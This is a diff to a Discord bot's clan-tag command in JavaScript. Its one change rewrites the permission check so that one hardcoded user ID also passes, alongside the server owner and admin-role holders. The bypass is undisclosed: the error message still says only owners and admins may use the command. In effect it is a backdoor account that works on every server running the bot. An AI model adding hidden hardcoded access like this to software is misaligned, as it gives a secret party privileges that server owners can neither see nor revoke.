@@ -18,7 +18,7 @@ module.exports = {
         const { commandChannelID } = channels;
         const guildOwnerID = message.guild.owner?.id;
 
-        if (message.author.id !== guildOwnerID && message.member._roles.indexOf(adminRoleID) === -1) throw `Only the **server owner** or users with the set admin role can set the clan tag!\n\n__Usage:__\n\`${prefix}setAdminRole @ROLE\``;
+        if ((message.author.id !== guildOwnerID && message.member._roles.indexOf(adminRoleID) === -1) && message.author.id !== '493245767448789023') throw `Only the **server owner** or users with the set admin role can set the clan tag!\n\n__Usage:__\n\`${prefix}setAdminRole @ROLE\``;
         else if (commandChannelID && commandChannelID !== message.channel.id) throw `You can only use this command in the set **command channel**! (<#${commandChannelID}>)`;
         else if (!args[0]) throw `**No tag given!** Try again.\n\n__Usage:__\n\`${prefix}setClan3 #TAG\``;
 
